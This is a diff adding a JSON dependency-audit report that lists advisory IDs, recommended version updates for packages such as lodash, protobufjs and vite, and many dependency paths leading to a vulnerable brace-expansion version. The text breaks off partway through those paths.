@@ -1,0 +1,1383 @@
+{
+  "actions": [
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1115540,
+          "path": ".>eslint>minimatch>brace-expansion",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "brace-expansion",
+      "target": "1.1.14",
+      "depth": 4
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1115551,
+          "path": ".>lint-staged>picomatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115554,
+          "path": ".>lint-staged>picomatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "picomatch",
+      "target": "4.0.4",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1115806,
+          "path": ".>eslint-config-react-app>eslint-plugin-flowtype>lodash",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115810,
+          "path": ".>eslint-config-react-app>eslint-plugin-flowtype>lodash",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "lodash",
+      "target": "4.18.1",
+      "depth": 4
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1116472,
+          "path": ".>@langchain/community>langsmith",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1116670,
+          "path": ".>@langchain/community>langsmith",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "langsmith",
+      "target": "0.5.20",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1116560,
+          "path": ".>@langchain/community>ibm-cloud-sdk-core>axios>follow-redirects",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "follow-redirects",
+      "target": "1.16.0",
+      "depth": 5
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1116756,
+          "path": ".>@ricky0123/vad-web>onnxruntime-web>protobufjs",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "protobufjs",
+      "target": "7.5.5",
+      "depth": 4
+    },
+    {
+      "action": "review",
+      "module": "vite",
+      "resolves": [
+        {
+          "id": 1116231,
+          "path": ".>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1116233,
+          "path": ".>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1116236,
+          "path": ".>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "langsmith",
+      "resolves": [
+        {
+          "id": 1116472,
+          "path": ".>@langchain/langgraph-cli>langsmith",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1116670,
+          "path": ".>@langchain/langgraph-cli>langsmith",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "dompurify",
+      "resolves": [
+        {
+          "id": 1116663,
+          "path": ".>dompurify",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "hono",
+      "resolves": [
+        {
+          "id": 1116669,
+          "path": ".>hono",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "protobufjs",
+      "resolves": [
+        {
+          "id": 1116756,
+          "path": ".>@xenova/transformers>onnxruntime-web>onnx-proto>protobufjs",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1115540": {
+      "findings": [
+        {
+          "version": "1.1.12",
+          "paths": [
+            ". > @typescript-eslint/eslint-plugin@8.58.0 > @typescript-eslint/parser@8.58.0 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > @typescript-eslint/eslint-plugin@8.58.0 > @typescript-eslint/parser@8.58.0 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > @typescript-eslint/eslint-plugin@8.58.0 > @typescript-eslint/parser@8.58.0 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > @typescript-eslint/eslint-plugin@8.58.0 > @typescript-eslint/parser@8.58.0 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > @typescript-eslint/eslint-plugin@8.58.0 > @typescript-eslint/type-utils@8.58.0 > @typescript-eslint/utils@8.58.0 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > @typescript-eslint/eslint-plugin@8.58.0 > @typescript-eslint/type-utils@8.58.0 > @typescript-eslint/utils@8.58.0 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > @typescript-eslint/eslint-plugin@8.58.0 > @typescript-eslint/type-utils@8.58.0 > @typescript-eslint/utils@8.58.0 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > @typescript-eslint/eslint-plugin@8.58.0 > @typescript-eslint/type-utils@8.58.0 > @typescript-eslint/utils@8.58.0 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > @typescript-eslint/eslint-plugin@8.58.0 > @typescript-eslint/type-utils@8.58.0 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > @typescript-eslint/eslint-plugin@8.58.0 > @typescript-eslint/type-utils@8.58.0 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > @typescript-eslint/eslint-plugin@8.58.0 > @typescript-eslint/type-utils@8.58.0 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > @typescript-eslint/eslint-plugin@8.58.0 > @typescript-eslint/type-utils@8.58.0 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > @typescript-eslint/eslint-plugin@8.58.0 > @typescript-eslint/utils@8.58.0 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > @typescript-eslint/eslint-plugin@8.58.0 > @typescript-eslint/utils@8.58.0 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > @typescript-eslint/eslint-plugin@8.58.0 > @typescript-eslint/utils@8.58.0 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > @typescript-eslint/eslint-plugin@8.58.0 > @typescript-eslint/utils@8.58.0 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > @typescript-eslint/eslint-plugin@8.58.0 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > @typescript-eslint/eslint-plugin@8.58.0 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > @typescript-eslint/eslint-plugin@8.58.0 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > @typescript-eslint/eslint-plugin@8.58.0 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > @typescript-eslint/parser@8.58.0 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > @typescript-eslint/parser@8.58.0 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > @typescript-eslint/parser@8.58.0 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > @typescript-eslint/parser@8.58.0 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-prettier@10.1.8 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-prettier@10.1.8 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-prettier@10.1.8 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-prettier@10.1.8 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > @babel/eslint-parser@7.28.6 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > @babel/eslint-parser@7.28.6 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > @babel/eslint-parser@7.28.6 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > @babel/eslint-parser@7.28.6 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/parser@5.62.0 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/parser@5.62.0 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/parser@5.62.0 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/parser@5.62.0 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/type-utils@5.62.0 > @typescript-eslint/utils@5.62.0 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/type-utils@5.62.0 > @typescript-eslint/utils@5.62.0 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/type-utils@5.62.0 > @typescript-eslint/utils@5.62.0 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/type-utils@5.62.0 > @typescript-eslint/utils@5.62.0 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/type-utils@5.62.0 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/type-utils@5.62.0 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/type-utils@5.62.0 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/type-utils@5.62.0 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/utils@5.62.0 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/utils@5.62.0 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/utils@5.62.0 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/utils@5.62.0 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > @typescript-eslint/eslint-plugin@5.62.0 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > @typescript-eslint/eslint-plugin@5.62.0 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > @typescript-eslint/eslint-plugin@5.62.0 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > @typescript-eslint/eslint-plugin@5.62.0 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > @typescript-eslint/parser@5.62.0 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > @typescript-eslint/parser@5.62.0 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > @typescript-eslint/parser@5.62.0 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > @typescript-eslint/parser@5.62.0 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-flowtype@8.0.3 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-flowtype@8.0.3 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-flowtype@8.0.3 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-flowtype@8.0.3 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-import@2.32.0 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-import@2.32.0 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-import@2.32.0 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-import@2.32.0 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > @typescript-eslint/parser@5.62.0 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > @typescript-eslint/parser@5.62.0 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > @typescript-eslint/parser@5.62.0 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > @typescript-eslint/parser@5.62.0 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-import@2.32.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-import@2.32.0 > @typescript-eslint/parser@5.62.0 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-import@2.32.0 > @typescript-eslint/parser@5.62.0 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-import@2.32.0 > @typescript-eslint/parser@5.62.0 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-import@2.32.0 > @typescript-eslint/parser@5.62.0 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > @typescript-eslint/experimental-utils@5.62.0 > @typescript-eslint/utils@5.62.0 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > @typescript-eslint/experimental-utils@5.62.0 > @typescript-eslint/utils@5.62.0 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > @typescript-eslint/experimental-utils@5.62.0 > @typescript-eslint/utils@5.62.0 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > @typescript-eslint/experimental-utils@5.62.0 > @typescript-eslint/utils@5.62.0 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > @typescript-eslint/experimental-utils@5.62.0 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > @typescript-eslint/experimental-utils@5.62.0 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > @typescript-eslint/experimental-utils@5.62.0 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > @typescript-eslint/experimental-utils@5.62.0 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/parser@5.62.0 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/parser@5.62.0 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/parser@5.62.0 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/parser@5.62.0 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/type-utils@5.62.0 > @typescript-eslint/utils@5.62.0 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/type-utils@5.62.0 > @typescript-eslint/utils@5.62.0 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/type-utils@5.62.0 > @typescript-eslint/utils@5.62.0 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/type-utils@5.62.0 > @typescript-eslint/utils@5.62.0 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/type-utils@5.62.0 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/type-utils@5.62.0 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/type-utils@5.62.0 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/type-utils@5.62.0 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/utils@5.62.0 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/utils@5.62.0 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/utils@5.62.0 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > @typescript-eslint/eslint-plugin@5.62.0 > @typescript-eslint/utils@5.62.0 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > @typescript-eslint/eslint-plugin@5.62.0 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > @typescript-eslint/eslint-plugin@5.62.0 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
